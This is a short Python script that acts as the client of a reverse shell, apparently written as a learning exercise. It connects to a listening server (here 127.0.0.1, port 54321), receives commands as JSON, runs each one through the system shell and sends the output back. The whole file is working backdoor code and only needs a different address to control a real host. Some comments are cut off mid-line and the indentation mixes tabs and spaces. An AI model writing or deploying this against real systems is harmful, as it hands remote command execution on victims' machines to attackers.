#!/usr/bin/python
import socket
import subprocess
import json

def reliable_send(data): # gets raw command input and send>
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv(): # recieve as much data as you want
        json_data = ""
        while True:
                try:
			json_data = json_data + sock.recv(1024)
                        return json.loads(json_data) # doe>
                except ValueError: # if sent data > 1024 b>
                        continue


def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except: # if the message is not an executable command
				reliable_send("[!!] Can't execute that command")

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1",54321))
print("Connection established to server")
shell()

sock.close()
